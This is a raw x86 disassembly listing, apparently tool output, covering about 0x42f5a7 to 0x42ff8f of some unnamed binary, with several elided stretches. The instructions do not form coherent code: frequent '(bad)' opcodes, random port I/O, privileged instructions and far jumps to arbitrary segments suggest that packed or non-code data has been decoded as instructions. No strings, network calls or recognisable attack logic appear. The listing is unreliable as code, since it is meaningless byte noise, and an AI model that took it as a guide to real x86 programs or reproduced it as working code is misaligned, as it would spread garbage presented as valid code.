  42f5a7:	adc    eax,0x44ed0cc5
  42f5ac:	lods   eax,DWORD PTR ds:[esi]
  42f5ad:	cmp    al,0xee
  42f5af:	adc    ebp,DWORD PTR [edx+ebp*8-0x1c]
  42f5b3:	stos   DWORD PTR es:[edi],eax
  42f5b4:	jl     0x42f5b6
	...
  42f616:	ds push esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x7c]
  42f623:	out    dx,eax
  42f624:	adc    DWORD PTR [ebp-0x10],ebp
  42f627:	sti    
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [eax-0x1c67ad7c],bh
  42f633:	mov    ds:0x19989ad2,eax
  42f638:	adc    ebp,DWORD PTR [edi-0x55eb8108]
  42f63e:	pop    esp
  42f63f:	xchg   DWORD PTR [eax],ebx
  42f641:	xor    esi,ebx
  42f643:	test   bh,bl
  42f645:	in     eax,dx
  42f646:	in     al,dx
  42f647:	cmp    eax,0xb38e13b1
  42f64c:	sbb    ecx,ebx
  42f64e:	or     eax,DWORD PTR [esi-0x7a]
  42f651:	pop    esi
  42f652:	(bad)  
  42f653:	jns    0x42f5ef
  42f655:	sbb    dh,BYTE PTR [ecx]
  42f657:	lods   al,BYTE PTR ds:[esi]
  42f658:	fimul  DWORD PTR [ebp+0x1195357f]
  42f65e:	add    eax,0x5e807134
  42f663:	test   al,0xdc
  42f665:	dec    ecx
  42f666:	mov    bh,0xe3
  42f668:	iret   
  42f669:	sbb    esi,eax
  42f66b:	jno    0x42f606
  42f66d:	adc    edi,esp
  42f66f:	xchg   edx,eax
  42f670:	nop
  42f671:	lea    eax,[ecx-0x30]
  42f674:	js     0x42f69e
  42f676:	scas   eax,DWORD PTR es:[edi]
  42f677:	inc    ecx
  42f678:	clc    
  42f679:	jno    0x42f6e2
  42f67b:	xor    ch,BYTE PTR [edx+0x7558ff0a]
  42f681:	and    BYTE PTR [ecx],dl
  42f683:	jns    0x42f6da
  42f685:	lods   eax,DWORD PTR ds:[esi]
  42f686:	les    ecx,FWORD PTR [edi-0x2c]
  42f689:	ficomp DWORD PTR [edx-0x28]
  42f68c:	mov    ds:0x74858f5e,eax
  42f691:	mov    ebx,0x16df7ad4
  42f696:	call   0xcd15:0x24539ea9
  42f69d:	pusha  
  42f69e:	pop    eax
  42f69f:	in     al,dx
  42f6a0:	call   0x34b98733
  42f6a5:	outs   dx,BYTE PTR ds:[esi]
  42f6a6:	in     al,0xe8
  42f6a8:	pop    ecx
  42f6a9:	cdq    
  42f6aa:	mov    dl,0x3c
  42f6ac:	jnp    0x42f630
  42f6ae:	push   0x7c3c3f4d
  42f6b3:	test   BYTE PTR [ebx],bl
  42f6b5:	adc    ebp,eax
  42f6b7:	mov    ebp,0x6f956236
  42f6bc:	xchg   ebp,eax
  42f6bd:	inc    edx
  42f6be:	mov    DWORD PTR cs:[ebp+eiz*2+0x6a],0xdf679be3
  42f6c7:	(bad)  
  42f6c8:	push   ebp
  42f6c9:	and    edx,edx
  42f6cb:	xor    esi,DWORD PTR [esi-0x7d]
  42f6ce:	adc    dl,BYTE PTR [edx]
  42f6d0:	or     eax,0xaedf9174
  42f6d5:	pop    ebp
  42f6d6:	ins    BYTE PTR es:[edi],dx
  42f6d7:	loope  0x42f6ce
  42f6d9:	es sbb eax,0x8656c39d
  42f6df:	adc    al,0x71
  42f6e1:	xchg   ebp,eax
  42f6e2:	in     al,dx
  42f6e3:	dec    eax
  42f6e4:	jae    0x42f72e
  42f6e6:	nop
  42f6e7:	add    dl,dh
  42f6e9:	bswap  ebp
  42f6eb:	fucom  st(0)
  42f6ed:	sbb    ebx,ebx
  42f6ef:	mov    esi,0x8ff25d38
  42f6f4:	(bad)  
  42f6f5:	or     BYTE PTR cs:[edx],ch
  42f6f8:	pop    edx
  42f6f9:	push   fs
  42f6fb:	gs push ss
  42f6fd:	sti    
  42f6fe:	sbb    eax,0x3c139e19
  42f703:	jg     0x42f6fd
  42f705:	shl    BYTE PTR [ecx-0x6260605e],cl
  42f70b:	(bad)  
  42f70c:	lock pushf 
  42f70e:	mov    ecx,ebp
  42f710:	dec    esi
  42f711:	jno    0x42f6f7
  42f713:	jg     0x42f76e
  42f715:	add    esi,DWORD PTR ds:0x7a66d048
  42f71b:	mov    ds:0xbeaeafd3,eax
  42f720:	fidivr WORD PTR [ecx]
  42f722:	cmp    ebp,esp
  42f724:	cmp    ch,BYTE PTR [edi-0x2ac636d0]
  42f72a:	xchg   ebp,eax
  42f72b:	int    0x4
  42f72d:	frstor [edi-0x5e]
  42f730:	push   eax
  42f731:	jle    0x42f746
  42f733:	push   esp
  42f734:	cwde   
	...
  42f795:	add    BYTE PTR [ecx-0x5f],dh
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	push   esp
  42f7a3:	xor    eax,0xfcf734d7
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [ecx],dh
  42f7af:	arpl   WORD PTR [ebp-0x80],sp
  42f7b2:	jnp    0x42f7d1
  42f7b4:	addr16 mov ecx,0x84c1d34e
  42f7ba:	and    esp,DWORD PTR [edi+edx*4]
  42f7bd:	mov    esi,0x8fdd0bdb
  42f7c2:	push   ebp
  42f7c3:	sbb    DWORD PTR [esi+eiz*4-0x1501aa97],edi
  42f7ca:	shl    DWORD PTR [ecx-0x14d38128],0x27
  42f7d1:	inc    esi
  42f7d2:	fnstcw WORD PTR [esi]
  42f7d4:	push   ebp
  42f7d5:	jne    0x42f791
  42f7d7:	test   eax,0x9d49a099
  42f7dc:	outs   dx,DWORD PTR ds:[esi]
  42f7dd:	jmp    0x9d7:0x4995d01a
  42f7e4:	clc    
  42f7e5:	mov    ebx,0x3db531be
  42f7ea:	push   ebx
  42f7eb:	adc    al,0x29
  42f7ed:	(bad)  
  42f7ee:	scas   al,BYTE PTR es:[edi]
  42f7ef:	and    BYTE PTR [esp+eiz*4-0x23],bh
  42f7f3:	in     al,0x8b
  42f7f5:	test   eax,0xcc0216e3
  42f7fa:	jle    0x42f7e3
  42f7fc:	hlt    
  42f7fd:	cs jg  0x42f7fb
  42f800:	inc    edx
  42f801:	outs   dx,BYTE PTR ds:[esi]
  42f802:	wrmsr  
  42f804:	test   al,0xa
  42f806:	bndldx bnd0,[edi]
  42f809:	shl    BYTE PTR [esi],0xb
  42f80c:	mov    ch,0xba
  42f80e:	je     0x42f7eb
  42f810:	push   edi
  42f812:	mov    ds:0xe459b44f,eax
  42f817:	mov    al,ds:0xb4a219d3
  42f81c:	or     DWORD PTR [ecx],edx
  42f81e:	jmp    0x42f805
  42f820:	xchg   esi,eax
  42f821:	ss (bad) 
  42f823:	mov    ch,0x48
  42f825:	aad    0xc1
  42f827:	xor    DWORD PTR ds:[edi],ebp
  42f82a:	mov    dh,0xc8
  42f82c:	(bad)  
  42f82e:	mov    ds:0xe7a8e3b0,eax
  42f833:	ins    DWORD PTR es:[edi],dx
  42f834:	mov    BYTE PTR [esi-0x60f23cd3],al
  42f83a:	daa    
  42f83b:	xor    eax,0x94b7f919
  42f840:	pop    ss
  42f841:	sbb    eax,0x1a34f1a
  42f846:	xchg   esi,eax
  42f847:	xchg   esp,eax
  42f848:	mov    ah,0x98
  42f84a:	cmp    esp,ecx
  42f84c:	mov    ah,0x6a
  42f84e:	fs je  0x42f809
  42f851:	xor    al,0xcc
  42f853:	je     0x42f836
  42f855:	lock imul eax,ecx,0xbb763780
  42f85c:	outs   dx,DWORD PTR ds:[esi]
  42f85d:	(bad)  
  42f85e:	xor    ah,dh
  42f860:	push   0x183bb31e
  42f865:	sbb    BYTE PTR [ecx],ch
  42f867:	sbb    eax,0x41dd125a
  42f86c:	fsubr  DWORD PTR [eax+0x152dcfa7]
  42f872:	pop    ebx
  42f873:	cli    
  42f874:	xchg   ecx,eax
  42f875:	arpl   WORD PTR [ebp+0x1258305b],ax
  42f87b:	loope  0x42f8eb
  42f87d:	and    al,0xf2
  42f87f:	sbb    al,0x2d
  42f881:	(bad)  
  42f882:	aad    0xa3
  42f884:	mov    esi,0xb21c17a5
  42f889:	mov    edi,0x3e2421d0
  42f88e:	push   eax
  42f88f:	and    esi,ebx
  42f891:	push   es
  42f892:	sbb    al,0x4d
  42f894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f895:	or     al,0x2
  42f897:	push   eax
  42f898:	(bad)  
  42f899:	aas    
  42f89a:	lods   al,BYTE PTR ds:[esi]
  42f89b:	dec    eax
  42f89c:	pop    DWORD PTR [esi]
  42f89e:	fcmovu st,st(1)
  42f8a0:	dec    edx
  42f8a1:	ja     0x42f843
  42f8a3:	jl     0x42f856
  42f8a5:	xor    BYTE PTR [edi+ebx*8-0x73],ch
  42f8a9:	popf   
  42f8aa:	mov    BYTE PTR [edx+0x392ef581],0x51
  42f8b1:	or     BYTE PTR [ecx],ah
  42f8b3:	test   BYTE PTR [eax+0x0],bh
	...
  42f916:	adc    al,0x74
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx+0x1862ed9c],1
  42f925:	aas    
  42f926:	(bad)  
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    bl,dh
  42f92f:	pusha  
  42f930:	cmp    esi,DWORD PTR [esi+0x55]
  42f933:	xchg   edx,eax
  42f934:	inc    ecx
  42f935:	xchg   ebp,eax
  42f936:	out    dx,al
  42f937:	xor    ah,ah
  42f939:	hlt    
  42f93a:	push   esp
  42f93b:	fs or  eax,0xbca62020
  42f941:	dec    ecx
  42f942:	dec    eax
  42f943:	stc    
  42f944:	pushf  
  42f945:	mov    al,al
  42f947:	mov    ds:0xa38c11bf,al
  42f94c:	rcr    BYTE PTR [edi-0x1c4633a0],cl
  42f952:	stc    
  42f953:	mov    ds:0xc74fee7c,eax
  42f958:	(bad)  
  42f959:	and    dh,dh
  42f95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f95c:	sbb    ebx,DWORD PTR [eax-0x29]
  42f95f:	push   eax
  42f960:	push   eax
  42f961:	jmp    0x42f9b2
  42f963:	jns    0x42f904
  42f965:	lods   eax,DWORD PTR ds:[esi]
  42f966:	or     ch,BYTE PTR ds:0x5f537cf5
  42f96c:	mov    ss,WORD PTR ds:0x97715ff7
  42f972:	(bad)  
  42f974:	xor    cl,BYTE PTR [edx+0x17]
  42f977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f978:	dec    ebp
  42f979:	loop   0x42f958
  42f97b:	div    DWORD PTR [edi]
  42f97d:	lds    esi,FWORD PTR [esi-0x323b9afa]
  42f983:	and    al,0x64
  42f985:	adc    DWORD PTR [ebp-0x1b],ebp
  42f988:	out    0xe5,eax
  42f98a:	mov    ebp,0x458421a6
  42f98f:	out    0x1b,al
  42f991:	inc    ecx
  42f992:	dec    ebp
  42f993:	fs push 0xffffffd8
  42f996:	(bad)  [ebx+0x3a2a510c]
  42f99c:	enter  0x1f0e,0xf6
  42f9a0:	cmp    al,0x48
  42f9a2:	push   ds
  42f9a3:	push   ds
  42f9a4:	mov    ?,esp
  42f9a6:	pusha  
  42f9a7:	stos   DWORD PTR es:[edi],eax
  42f9a8:	les    edx,FWORD PTR [edi]
  42f9aa:	test   eax,0x187a3ce4
  42f9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9b0:	cld    
  42f9b1:	inc    esp
  42f9b2:	call   FWORD PTR [esp+edx*1-0x40]
  42f9b6:	ss cs xchg esp,eax
  42f9b9:	cmp    BYTE PTR ss:[ebx+0x3],bh
  42f9bd:	dec    esi
  42f9be:	or     eax,0x29903df2
  42f9c3:	loope  0x42fa22
  42f9c5:	rol    DWORD PTR [esp+ecx*4+0x57461369],cl
  42f9cc:	jbe    0x42f968
  42f9ce:	pop    eax
  42f9cf:	pop    ss
  42f9d0:	jo     0x42fa1d
  42f9d2:	pop    ebx
  42f9d4:	xchg   edi,eax
  42f9d5:	stc    
  42f9d6:	(bad)  
  42f9d7:	enter  0x88e8,0xbd
  42f9db:	in     eax,0xb8
  42f9dd:	in     al,dx
  42f9de:	push   cs
  42f9df:	sub    eax,0x5fc2f134
  42f9e4:	stos   DWORD PTR es:[edi],eax
  42f9e5:	xor    eax,0xc5f38d3f
  42f9ea:	cmp    al,cl
  42f9ec:	out    dx,eax
  42f9ed:	fisubr WORD PTR [esi+ebx*8-0x5a319cab]
  42f9f4:	jmp    0xc42a:0xe3380158
  42f9fb:	jmp    0x42f98b
  42f9fd:	dec    esi
  42f9fe:	lea    esp,[ebx*4-0x7afa2417]
  42fa05:	xchg   ecx,eax
  42fa06:	mov    al,0x23
  42fa08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa09:	jne    0x42fa6c
  42fa0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa0c:	add    al,0xa4
  42fa0e:	js     0x42fa53
  42fa10:	mov    esp,0x4130b452
  42fa15:	xchg   edi,eax
  42fa16:	push   esi
  42fa17:	xchg   edi,eax
  42fa18:	mov    ah,0xca
  42fa1a:	call   0x585b054f
  42fa1f:	out    0xef,eax
  42fa21:	cmp    cl,BYTE PTR [eax]
  42fa23:	ret    
  42fa24:	jmp    0x42f9f4
  42fa26:	dec    edi
  42fa27:	cmp    esp,ebp
  42fa29:	gs loopne 0x42fa48
  42fa2c:	das    
  42fa2d:	jl     0x42f9ba
  42fa2f:	pop    ds
  42fa30:	cmp    eax,0x147f39fa
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	(bad)  [esp+edx*8+0x1ff05c6]
  42faa9:	add    BYTE PTR [edi],al
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [ecx],cl
  42faaf:	adc    eax,0x206191e7
  42fab4:	dec    ebp
  42fab5:	fld    QWORD PTR [edx+0x7591c93]
  42fabb:	pop    edi
  42fabc:	push   edx
  42fabd:	out    dx,eax
  42fabe:	jne    0x42fb14
  42fac0:	add    dh,BYTE PTR [edi+ebp*8]
  42fac3:	loopne 0x42facf
  42fac5:	fidiv  DWORD PTR [edx+0x33]
  42fac8:	jb     0x42fab8
  42faca:	mov    WORD PTR [edx-0x23b085d6],?
  42fad0:	mov    ch,0xe1
  42fad2:	sub    ecx,DWORD PTR [ebx]
  42fad4:	lock pop ecx
  42fad6:	jl     0x42fb44
  42fad8:	clc    
  42fad9:	dec    edi
  42fada:	(bad)  
  42fadb:	je     0x42fa8e
  42fadd:	xchg   ebx,eax
  42fade:	aad    0xe1
  42fae0:	or     dh,BYTE PTR [ebp+0xa]
  42fae3:	dec    edi
  42fae4:	mov    ebp,0x3ec15686
  42fae9:	hlt    
  42faea:	jmp    0x42fa9f
  42faec:	cli    
  42faed:	adc    al,BYTE PTR [ebx+0x16]
  42faf0:	scas   eax,DWORD PTR es:[edi]
  42faf1:	test   DWORD PTR [esi+0x46],esi
  42faf4:	test   edi,ebp
  42faf6:	test   al,0x61
  42faf8:	or     eax,0x2b6a6a26
  42fafd:	push   ss
  42fafe:	cs push 0x24
  42fb01:	pop    edi
  42fb02:	out    dx,eax
  42fb03:	mov    cl,0x49
  42fb05:	sbb    dl,BYTE PTR [eax+edx*8]
  42fb08:	mov    eax,0x5d9e8ef7
  42fb0d:	idiv   DWORD PTR [ebp+0x38]
  42fb10:	sahf   
  42fb11:	cs xor eax,0x1ee91cea
  42fb17:	neg    BYTE PTR [ebp+ecx*4-0x39d71c49]
  42fb1e:	outs   dx,DWORD PTR ds:[esi]
  42fb1f:	rol    BYTE PTR [ebx+0x32],1
  42fb22:	mov    ds:0xd9340346,al
  42fb27:	adc    edx,DWORD PTR ds:0x322e1a7c
  42fb2d:	aam    0xab
  42fb2f:	std    
  42fb30:	rcl    DWORD PTR [ebx+ebx*8],0x72
  42fb34:	iret   
  42fb35:	and    ah,BYTE PTR [esp+ebx*1+0x2e]
  42fb39:	sbb    DWORD PTR [esi+0x7d550c2f],0xffffffa9
  42fb40:	repnz mov DWORD PTR ds:0x4b4682b9,eax
  42fb47:	test   eax,0x7dfcda58
  42fb4c:	adc    esi,eax
  42fb4e:	jecxz  0x42fb61
  42fb50:	mov    ds:0x277faf91,al
  42fb55:	ror    DWORD PTR [ecx+0x5398b946],0xb6
  42fb5c:	xchg   ebp,eax
  42fb5d:	cwde   
  42fb5e:	neg    DWORD PTR [ebx+0x1]
  42fb61:	inc    BYTE PTR [ecx+esi*1-0x667de7e7]
  42fb68:	test   DWORD PTR [esp+eax*8],0xe7c79ae3
  42fb6f:	idiv   DWORD PTR [ebx]
  42fb71:	sti    
  42fb72:	ror    BYTE PTR [ebx-0x4e],1
  42fb75:	sbb    eax,0xd9d4f494
  42fb7a:	jne    0x42fb3a
  42fb7c:	fdivr  QWORD PTR [edx+0x880228d]
  42fb82:	and    DWORD PTR [eax-0x64853f66],eax
  42fb88:	or     al,0x8f
  42fb8a:	inc    eax
  42fb8b:	pop    ebp
  42fb8c:	xchg   edi,eax
  42fb8d:	dec    edi
  42fb8e:	cwde   
  42fb8f:	mov    ch,0x4b
  42fb91:	inc    edx
  42fb92:	lahf   
  42fb93:	cdq    
  42fb94:	mov    edi,0x89a782cc
  42fb99:	jp     0x42fb39
  42fb9b:	sbb    dl,BYTE PTR [edx-0x71]
  42fb9e:	cld    
  42fb9f:	adc    DWORD PTR [edi-0x29ba1b33],0xffffffe5
  42fba6:	in     al,dx
  42fba7:	sub    al,0x1e
  42fba9:	inc    BYTE PTR [ecx-0x48]
  42fbac:	fst    DWORD PTR [edx]
  42fbae:	out    dx,eax
  42fbaf:	jecxz  0x42fbab
  42fbb1:	mov    al,0x48
  42fbb3:	aam    0x18
	...
  42fc15:	add    BYTE PTR [ebx],cl
  42fc17:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc1d:	call   0x518f:0x9e5607ea
  42fc24:	push   ebp
  42fc25:	adc    eax,0x2000c
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [edx+0x4d],dh
  42fc30:	jmp    0x793c31c0
  42fc35:	cld    
  42fc36:	(bad)  
  42fc37:	add    al,0x81
  42fc39:	xchg   ecx,eax
  42fc3a:	dec    ebx
  42fc3b:	ds cdq 
  42fc3d:	pop    ss
  42fc3e:	nop
  42fc3f:	xchg   esp,eax
  42fc40:	mov    edi,0x221b9e18
  42fc45:	add    BYTE PTR [ebx-0x19cdb559],al
  42fc4b:	inc    ebp
  42fc4c:	and    dh,BYTE PTR [eax+ebp*4]
  42fc4f:	jno    0x42fc61
  42fc51:	inc    edx
  42fc52:	add    ebp,DWORD PTR [ebx-0x1d6fcd66]
  42fc58:	out    dx,eax
  42fc59:	out    0x7a,al
  42fc5b:	cmp    al,bl
  42fc5d:	lods   al,BYTE PTR ds:[esi]
  42fc5e:	cmp    eax,0x1f5dabc
  42fc63:	scas   eax,DWORD PTR es:[edi]
  42fc64:	das    
  42fc65:	aaa    
  42fc66:	adc    eax,0x94f5ff86
  42fc6b:	mov    ds:0xf4ea2ee1,al
  42fc70:	dec    ebp
  42fc71:	inc    edx
  42fc72:	sub    DWORD PTR [ecx+0x50717440],edx
  42fc78:	(bad)  
  42fc7a:	fsub   QWORD PTR [edi-0x3c55ba24]
  42fc80:	mov    ecx,0xb02c1d7b
  42fc85:	test   DWORD PTR [ebp-0x66],eax
  42fc88:	mov    dl,0xc4
  42fc8a:	fld    QWORD PTR [edx]
  42fc8c:	rcl    DWORD PTR [edx+0x72],1
  42fc8f:	bound  esp,QWORD PTR [ecx+0x24]
  42fc92:	lods   al,BYTE PTR ds:[esi]
  42fc93:	cmp    BYTE PTR [ecx],bl
  42fc95:	or     edx,0xffffffba
  42fc98:	(bad)  
  42fc99:	inc    edx
  42fc9a:	inc    edi
  42fc9b:	xor    BYTE PTR [ebp-0x6c],ah
  42fc9e:	in     eax,dx
  42fc9f:	mov    esi,0xa7fbe6df
  42fca4:	aad    0x79
  42fca6:	stc    
  42fca7:	pop    ds
  42fca8:	aaa    
  42fca9:	add    esi,DWORD PTR [ecx+eiz*1]
  42fcac:	jo     0x42fd1c
  42fcae:	lahf   
  42fcaf:	ja     0x42fc67
  42fcb1:	jp     0x42fc54
  42fcb3:	mov    BYTE PTR [eax+ebx*1+0x31],0x1d
  42fcb8:	ret    0x6a79
  42fcbb:	ins    BYTE PTR es:[edi],dx
  42fcbc:	add    eax,0xb6d9ebcc
  42fcc1:	out    dx,al
  42fcc2:	inc    ecx
  42fcc3:	es inc esi
  42fcc5:	xor    eax,0xf0f71b31
  42fcca:	jno    0x42fc57
  42fccc:	lods   al,BYTE PTR ds:[esi]
  42fccd:	push   esp
  42fcce:	enter  0xa63b,0x5
  42fcd2:	or     ebx,DWORD PTR [ebx+0x520be39a]
  42fcd8:	pop    ebp
  42fcd9:	jns    0x42fcb5
  42fcdb:	addr16 jle 0x42fd0c
  42fcde:	xor    BYTE PTR [eax+0x71],dl
  42fce1:	bound  ebx,QWORD PTR [esi+0x653988e4]
  42fce7:	enter  0xf7a5,0xe0
  42fceb:	test   edx,ecx
  42fced:	nop
  42fcee:	rcl    DWORD PTR [edx+0x2fadbc81],cl
  42fcf4:	sbb    ebp,DWORD PTR [ebp+0x45f8892e]
  42fcfa:	mov    al,ds:0xaced1ed7
  42fcff:	xchg   BYTE PTR [eax+0x1cb36cb6],dl
  42fd05:	cmp    DWORD PTR fs:[esi],ebx
  42fd08:	lock div BYTE PTR [ebp-0x72]
  42fd0c:	(bad)  
  42fd0d:	imul   esi,esi,0xc7d90dd9
  42fd13:	mov    bh,0xf6
  42fd15:	and    edx,DWORD PTR [edi+esi*2+0x64631a32]
  42fd1c:	or     eax,0x27cea2ca
  42fd21:	ret    0x67ca
  42fd24:	repz call 0xa266e660
  42fd2a:	fld    TBYTE PTR [edx-0x2b11ee63]
  42fd30:	faddp  st(3),st
  42fd33:	out    0xc8,al
	...
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0xeb
  42fda3:	or     cl,bl
  42fda5:	in     eax,dx
  42fda6:	adc    eax,DWORD PTR [ecx]
  42fda8:	add    al,BYTE PTR [eax]
  42fdaa:	pop    es
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [ebx],cl
  42fdaf:	dec    edi
  42fdb0:	int    0x95
  42fdb2:	push   ds
  42fdb3:	rcl    DWORD PTR [eax+esi*4-0x59c5eeb1],cl
  42fdba:	mov    esi,0x2b73082f
  42fdbf:	jle    0x42fe1e
  42fdc1:	add    esp,0x3d
  42fdc4:	(bad)  [esi+0x2780ef2f]
  42fdca:	rcr    DWORD PTR [esi],1
  42fdcc:	bound  esp,QWORD PTR [ecx+0x72610fe1]
  42fdd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fdd3:	dec    ebp
  42fdd4:	mov    esp,DWORD PTR [ecx]
  42fdd6:	rcl    DWORD PTR [edx+0x4f],cl
  42fdd9:	add    al,0x28
  42fddb:	jbe    0x42fd7e
  42fddd:	fstp   QWORD PTR [ecx-0x7b4db5ac]
  42fde3:	and    DWORD PTR [eax],esp
  42fde5:	adc    BYTE PTR [ecx-0x65],0xa0
  42fde9:	pop    ds
  42fdea:	adc    al,0x6a
  42fdec:	out    0x92,al
  42fdee:	push   esi
  42fdef:	add    esi,ecx
  42fdf1:	jp     0x42fd7e
  42fdf3:	pop    ds
  42fdf4:	lds    ebp,FWORD PTR [esi+0x19]
  42fdf7:	out    0xc6,al
  42fdf9:	xchg   edi,eax
  42fdfa:	inc    ebp
  42fdfb:	and    BYTE PTR [ebp+0x659a4bf6],bl
  42fe01:	mov    ebx,0x97333d95
  42fe06:	sbb    eax,0x4bd96af8
  42fe0b:	cwde   
  42fe0c:	add    eax,ebp
  42fe0e:	into   
  42fe0f:	inc    esi
  42fe10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe11:	xchg   ecx,eax
  42fe12:	in     eax,0xa9
  42fe14:	jmp    0x7770c86b
  42fe19:	jns    0x42fdef
  42fe1b:	hlt    
  42fe1c:	and    al,0x99
  42fe1e:	mov    ecx,0x1b817fe2
  42fe23:	outs   dx,DWORD PTR ds:[esi]
  42fe24:	or     edx,edx
  42fe26:	lds    esp,FWORD PTR ds:0x5b062abd
  42fe2c:	stos   DWORD PTR es:[edi],eax
  42fe2d:	ud1    edx,DWORD PTR [eax]
  42fe30:	sub    bh,al
  42fe32:	jmp    0x1fc:0x488bf86a
  42fe39:	lahf   
  42fe3a:	mov    DWORD PTR [ebx],ebx
  42fe3c:	and    al,0x0
  42fe3e:	ins    DWORD PTR es:[edi],dx
  42fe3f:	imul   eax,DWORD PTR [ebx-0x14],0xb532c019
  42fe46:	push   0x54
  42fe48:	xchg   edx,eax
  42fe49:	dec    esi
  42fe4a:	lock pop ds
  42fe4c:	fldcw  WORD PTR [edx+0x29dee73a]
  42fe52:	cmp    DWORD PTR [eax+0x4],edi
  42fe55:	jo     0x42fe34
  42fe57:	dec    edi
  42fe58:	mov    esi,0xe694d7c8
  42fe5d:	lahf   
  42fe5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe60:	mov    eax,0xa0bfdc14
  42fe65:	jne    0x42fe2f
  42fe67:	scas   al,BYTE PTR es:[edi]
  42fe68:	jmp    0x94d325f5
  42fe6d:	xchg   esi,eax
  42fe6e:	data16 stc 
  42fe70:	enter  0x538f,0x8f
  42fe74:	fmul   st,st(5)
  42fe76:	xchg   ebp,eax
  42fe77:	jnp    0x42fe3f
  42fe79:	fwait
  42fe7a:	push   0xffffffde
  42fe7c:	retf   
  42fe7d:	add    dl,BYTE PTR [ebx+0x49]
  42fe80:	sahf   
  42fe81:	or     cl,BYTE PTR [edx+0x1c]
  42fe84:	jg     0x42fe36
  42fe86:	mov    ah,0x24
  42fe88:	mov    BYTE PTR [ecx],bh
  42fe8a:	lock add DWORD PTR [ebx+0x14],edi
  42fe8e:	cmp    DWORD PTR [esi+0x2],edi
  42fe91:	jmp    0x4b25:0x2daa7148
  42fe98:	mov    ah,BYTE PTR [ecx]
  42fe9a:	jmp    edx
  42fe9c:	scas   eax,DWORD PTR es:[edi]
  42fe9d:	fcom   QWORD PTR [esi+0x74]
  42fea0:	(bad)  
  42fea1:	adc    al,0xfa
  42fea3:	ja     0x42fe4a
  42fea5:	push   0x506cbcda
  42feaa:	call   0x67f39d3e
  42feaf:	sbb    eax,0x299706
  42feb4:	pop    eax
	...
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	retf   0x3d74
  42ff25:	pop    eax
  42ff26:	sbb    al,BYTE PTR [edx]
  42ff28:	add    al,BYTE PTR [eax]
  42ff2a:	pop    es
  42ff2b:	add    DWORD PTR [eax],eax
  42ff2d:	add    BYTE PTR [edi+0x39],dh
  42ff30:	xor    al,0x90
  42ff32:	sub    eax,0xea1359e5
  42ff37:	scas   al,BYTE PTR es:[edi]
  42ff38:	adc    dh,BYTE PTR [ecx+0x7a]
  42ff3b:	outs   dx,BYTE PTR ds:[esi]
  42ff3c:	xchg   edi,eax
  42ff3d:	jae    0x42ff78
  42ff3f:	jae    0x42fec7
  42ff41:	jmp    0x7eec:0xebc0a574
  42ff48:	add    DWORD PTR [esi+0x6d],ebp
  42ff4b:	xor    dl,ah
  42ff4d:	pop    eax
  42ff4e:	(bad)  
  42ff4f:	cld    
  42ff50:	pop    ebp
  42ff51:	daa    
  42ff52:	clc    
  42ff53:	stos   DWORD PTR es:[edi],eax
  42ff54:	mov    bl,0x1f
  42ff56:	cwde   
  42ff57:	fild   WORD PTR [eax+0x73]
  42ff5a:	cdq    
  42ff5b:	lods   eax,DWORD PTR ds:[esi]
  42ff5c:	dec    esi
  42ff5d:	mov    BYTE PTR [esi],0xc
  42ff60:	cs aad 0x8f
  42ff63:	stos   BYTE PTR es:[edi],al
  42ff64:	unpcklps xmm6,XMMWORD PTR [edx]
  42ff67:	mov    ds:0x716c27f0,al
  42ff6c:	mov    eax,ds:0xb79f5828
  42ff72:	aad    0x3d
  42ff74:	push   edi
  42ff75:	cmc    
  42ff76:	imul   edi,DWORD PTR [eax+0x5e2da213],0xffffffb9
  42ff7d:	xchg   edi,eax
  42ff7e:	and    bh,BYTE PTR [ebx]
  42ff80:	inc    eax
  42ff81:	sbb    al,0x77
  42ff83:	aaa    
  42ff84:	mov    bh,0xd6
  42ff86:	push   eax
  42ff87:	and    al,dh
  42ff89:	or     DWORD PTR [ebp-0x48ef60b4],eax
  42ff8f:	dec    edi
